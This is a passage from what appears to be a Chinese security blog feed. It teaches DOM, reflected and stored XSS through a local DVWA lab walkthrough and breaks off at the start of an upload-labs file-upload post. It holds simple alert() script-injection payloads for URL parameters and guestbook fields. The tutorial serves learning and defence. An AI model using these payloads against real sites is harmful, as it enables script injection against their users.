&lt;h1 id=&#34;XSS攻击方式与样例&#34;&gt;&lt;a href=&#34;#XSS攻击方式与样例&#34; class=&#34;headerlink&#34; title=&#34;XSS攻击方式与样例&#34;&gt;&lt;/a&gt;XSS攻击方式与样例&lt;/h1&gt;&lt;h2 id=&#34;XSS盗用用户信息&#34;&gt;&lt;a href=&#34;#XSS盗用用户信息&#34; class=&#34;headerlink&#34; title=&#34;XSS盗用用户信息&#34;&gt;&lt;/a&gt;XSS盗用用户信息&lt;/h2&gt;&lt;h2 id=&#34;XSS盗取Cookie&#34;&gt;&lt;a href=&#34;#XSS盗取Cookie&#34; class=&#34;headerlink&#34; title=&#34;XSS盗取Cookie&#34;&gt;&lt;/a&gt;XSS盗取Cookie&lt;/h2&gt;&lt;h2 id=&#34;XSS钓鱼攻击&#34;&gt;&lt;a href=&#34;#XSS钓鱼攻击&#34; class=&#34;headerlink&#34; title=&#34;XSS钓鱼攻击&#34;&gt;&lt;/a&gt;XSS钓鱼攻击&lt;/h2&gt;&lt;p&gt;链接上含有攻击代码&lt;/p&gt;
&lt;h2 id=&#34;XSS蠕虫攻击&#34;&gt;&lt;a href=&#34;#XSS蠕虫攻击&#34; class=&#34;headerlink&#34; title=&#34;XSS蠕虫攻击&#34;&gt;&lt;/a&gt;XSS蠕虫攻击&lt;/h2&gt;&lt;p&gt;XSS蠕虫的破坏力和影响力都是巨大的。XSS蠕虫主要发生在用户之间存在交互行为的页面中，当Web引用程序对用户输入的数据信息没有做严格的过滤时，通过结合用户的登录状态、API调用、&lt;code&gt;Ajax的异步提交&lt;/code&gt;，就可以实现在植入恶意代码的同时，将恶意代码进行对外发送，即实现了代码的感染和传播，也就形成了XSS蠕虫。&lt;/p&gt;
&lt;p&gt;MySpace的Samy XSS蠕虫攻击事件是出现最早、最出名的XSS蠕虫攻击事件。&lt;/p&gt;
&lt;h1 id=&#34;通过实验深入了解XSS三个分类&#34;&gt;&lt;a href=&#34;#通过实验深入了解XSS三个分类&#34; class=&#34;headerlink&#34; title=&#34;通过实验深入了解XSS三个分类&#34;&gt;&lt;/a&gt;通过实验深入了解XSS三个分类&lt;/h1&gt;&lt;p&gt;首先我们安装DVWA，使用账号：admin，密码：password进行登录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：如果登录不上去，就访问&lt;code&gt;127.0.0.1/dvwa/setup.php&lt;/code&gt;，点击最下方的&lt;code&gt;Create/Reset&lt;/code&gt;按钮&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004210441095.png&#34; alt=&#34;image-20221004210441095&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置DVWA Security【从最低难度low开始吧】，点击&lt;code&gt;submit&lt;/code&gt;等待刷新设置完成&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004210537809.png&#34; alt=&#34;image-20221004210537809&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;DOM型XSS-1&#34;&gt;&lt;a href=&#34;#DOM型XSS-1&#34; class=&#34;headerlink&#34; title=&#34;DOM型XSS&#34;&gt;&lt;/a&gt;DOM型XSS&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image-20221004210944194.png&#34; alt=&#34;image-20221004210944194&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先我们看到下拉框，就要想一想，这个下拉框是从哪里来的。&lt;/p&gt;
&lt;p&gt;我们可以F12刷新，看一下XHR请求【Ajax】&lt;/p&gt;
&lt;p&gt;这里讲一下&lt;code&gt;XHR&lt;/code&gt;和&lt;code&gt;AJax&lt;/code&gt;的关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt; （简称&lt;code&gt;XHR&lt;/code&gt;）对象用于和服务器交换数据，是基于&lt;code&gt;XML&lt;/code&gt;的&lt;code&gt;HTTP&lt;/code&gt;请求。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;是一个浏览器接口，使得&lt;code&gt;Javascript&lt;/code&gt;可以进行&lt;code&gt;HTTP(S)&lt;/code&gt;通信。&lt;/li&gt;
&lt;li&gt;自从浏览器提供有了&lt;code&gt;XMLHTTPRequest&lt;/code&gt;这个接口之后，Ajax操作就此诞生。&lt;/li&gt;
&lt;li&gt;我们再来说说什么是&lt;code&gt;Ajax&lt;/code&gt;，&lt;code&gt;Ajax&lt;/code&gt; 即 &lt;code&gt;Asynchronous JavaScript and XML&lt;/code&gt;，翻译为：&lt;code&gt;异步&lt;/code&gt;的 &lt;code&gt;JavaScript&lt;/code&gt;和&lt;code&gt;XML&lt;/code&gt;。【&lt;strong&gt;重点！！&lt;/strong&gt;】&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ajax&lt;/code&gt;就是基于浏览器提供的&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象来实现的。【&lt;strong&gt;重点！！&lt;/strong&gt;】&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;传统的网页（不使用 Ajax）如果需要更新内容，必需重载整个网页面。&lt;/p&gt;
&lt;p&gt;自从有了Ajax之后，我们就可以实现&lt;strong&gt;异步地加载网页&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;什么叫异步？&lt;/p&gt;
&lt;p&gt;异步，异嘛，不同的意思，这里也就是指&lt;code&gt;不跟&lt;/code&gt;浏览器加载执行网页代码的&lt;code&gt;步伐&lt;/code&gt;一致，也就是说在一个网页中&lt;code&gt;需要用户操作来触发执行代码&lt;/code&gt;，而不是整个网页代码&lt;code&gt;一次性执行完毕&lt;/code&gt;(这里的用户操作是指在同一个网页下面请求代码执行渲染，而不是让浏览器直接跳转渲染另一个页面)。&lt;/p&gt;
&lt;p&gt;Ajax指的是异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。所以，XMLHttpRequest 对象如果要用于 Ajax 的话，其 open() 方法的 async 参数必须设置为 true。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;xmlhttp.&lt;span class=&#34;title function_ invoke__&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ajax_test.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004211458850.png&#34; alt=&#34;image-20221004211458850&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以表明，这个页面&lt;strong&gt;没有单独去请求一个功能链接&lt;/strong&gt;来返回下拉链表内容。&lt;/p&gt;
&lt;p&gt;因此，我们直接去看源代码，鼠标右键，查看源代码【XSS攻击是基于前台源码的攻击】。&lt;/p&gt;
&lt;p&gt;搜索关键字符：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004213743525.png&#34; alt=&#34;image-20221004213743525&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于HTML的标签基本定义如下&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签定义 HTML 文档中的一个分隔区块或者一个区域部分。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;标签常用于组合块级元素，以便通过 CSS 来对这些元素进行格式化。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签用于定义一个段落。 段落和段落之间有空隙。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签用于创建供用户输入的 HTML 表单。表单用于向服务端发送数据。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt; 元素包含一个或多个如下的表单元素：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt;&amp;gt;&lt;/span&gt; 有输入框&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;textarea&lt;/span&gt;&amp;gt;&lt;/span&gt;  标签定义多行的文本输入控件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt; 提交按钮&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;select&lt;/span&gt;&amp;gt;&lt;/span&gt; 有下拉菜单属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt; 单选框&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;optgroup&lt;/span&gt;&amp;gt;&lt;/span&gt; 复选框&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;fieldset&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签将表单内容的一部分打包，生成一组相关表单的字段。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;label&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签为 input 元素定义标注（标记）。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，源码中显示这个form标签里面嵌有一段script标签引起的JavaScript代码&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        var lang = document.location.href.substring(document.location.href.indexOf(&amp;quot;default=&amp;quot;)+8);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot; + lang + &amp;quot;&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot; + (lang) + &amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;disabled&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;disabled&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;----&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;English&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;English&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;French&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;French&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;Spanish&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;Spanish&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;German&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;German&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;主逻辑是：&lt;/p&gt;
&lt;p&gt;获取当前form表单document的location对象的href（当前浏览的url值，对于下图就是&lt;code&gt;http://127.0.0.1/DVWA/vulnerabilities/xss_d/&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;然后判断这个url字符串中“default=”第一次出现的位置是否&amp;gt;=0&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004215924339.png&#34; alt=&#34;image-20221004215924339&#34;&gt;&lt;/p&gt;
&lt;p&gt;当然，我们回到刚刚的页面上就是在获取这个url&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004220400905.png&#34; alt=&#34;image-20221004220400905&#34;&gt;&lt;/p&gt;
&lt;p&gt;substring(start,stop)&lt;/p&gt;
&lt;p&gt;然后截取从“default=”第一次出现的位置 + 8【也就是=号右边第一个字符，把整个“default=”跨了过去】到结尾的内容的字符串，保存到lang变量。&lt;/p&gt;
&lt;p&gt;往document，也就是当前html页面的option标签的value值中写入刚刚获取到的lang值，其选项显示部分使用decoreURI对lang进行解码，由于English中未含有非英文部分，所以就是English。【这一步会往选项里再添加一个English】&lt;/p&gt;
&lt;p&gt;接着往当前html页面的option标签里的value写入空，且关闭其选择属性，加入——这个选项。【这一步会往选项里再添加一个——】&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004221129050.png&#34; alt=&#34;image-20221004221129050&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，我们可以看到，这个lang是从当前url里获取到的，且未经过任何校验就直接写入标签中。&lt;/p&gt;
&lt;p&gt;我们可以控制这个lang变量，使其直接执行js脚本&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004221907384.png&#34; alt=&#34;image-20221004221907384&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//127.0.0.1/DVWA/vulnerabilities/xss_d/?default=&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004222113645.png&#34; alt=&#34;image-20221004222113645&#34;&gt;&lt;/p&gt;
&lt;p&gt;其改变了当前HTML的页面DOM结构，因此，我们称其为DOM型XSS攻击。&lt;/p&gt;
&lt;h2 id=&#34;反射型XSS-1&#34;&gt;&lt;a href=&#34;#反射型XSS-1&#34; class=&#34;headerlink&#34; title=&#34;反射型XSS&#34;&gt;&lt;/a&gt;反射型XSS&lt;/h2&gt;&lt;p&gt;我们输入11111，结果看到页面回显了”Hello 11111”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004222654007.png&#34; alt=&#34;image-20221004222654007&#34;&gt;&lt;/p&gt;
&lt;p&gt;看一下前台代码，是使用GET请求去将获取text的内容发送给服务器，而text我们可控&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004222954963.png&#34; alt=&#34;image-20221004222954963&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入11111，会回显到前台。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004223147315.png&#34; alt=&#34;image-20221004223147315&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，我们发现11111可能未经过处理，直接放入pre标签显示。&lt;/p&gt;
&lt;p&gt;因此可以在pre标签里插入script标签，完成弹窗操作。&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert(666)&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004223056096.png&#34; alt=&#34;image-20221004223056096&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为这个页面将一些交互内容回显到了前台上，使得我们成功利用Js脚本完成攻击，我们称其为反射型XSS攻击。&lt;/p&gt;
&lt;h2 id=&#34;存储型XSS-1&#34;&gt;&lt;a href=&#34;#存储型XSS-1&#34; class=&#34;headerlink&#34; title=&#34;存储型XSS&#34;&gt;&lt;/a&gt;存储型XSS&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image-20221004223720910.png&#34; alt=&#34;image-20221004223720910&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们通过留言功能，可以看到我们的输入会被记录在页面上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004223847678.png&#34; alt=&#34;image-20221004223847678&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们按照刚刚的思路，直接尝试看看能否弹窗。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Name：jack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Message：&amp;lt;script&amp;gt;alert(1234)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;刷新回来后会一直弹窗&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004224120560.png&#34; alt=&#34;image-20221004224120560&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们看下源码信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004224444379.png&#34; alt=&#34;image-20221004224444379&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们看到Name的maxlength为10，Message的length为50，所以使用Message来做XSS攻击更合适一些&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;最简短的js脚本也有24个字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004224705526.png&#34; alt=&#34;image-20221004224705526&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果两个长度都不限，则都适合用来XSS攻击。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/</guid>
            <title>特殊的文件上传漏洞（二）</title>
            <link>https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/</link>
            <category>文件上传漏洞探究</category>
            <pubDate>Tue, 04 Oct 2022 10:51:46 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;特殊的文件上传漏洞（二）&#34;&gt;&lt;a href=&#34;#特殊的文件上传漏洞（二）&#34; class=&#34;headerlink&#34; title=&#34;特殊的文件上传漏洞（二）&#34;&gt;&lt;/a&gt;特殊的文件上传漏洞（二）&lt;/h1&gt;&lt;p&gt;本章节讲解特殊的文件上传漏洞（二）。&lt;/p&gt;
&lt;h2 id=&#34;绕过图像二次渲染&#34;&gt;&lt;a href=&#34;#绕过图像二次渲染&#34; class=&#34;headerlink&#34; title=&#34;绕过图像二次渲染&#34;&gt;&lt;/a&gt;绕过图像二次渲染&lt;/h2&gt;&lt;p&gt;Pass-16为例&lt;/p&gt;
&lt;p&gt;直接审计源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;=UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;basename&lt;/span&gt;(&lt;span 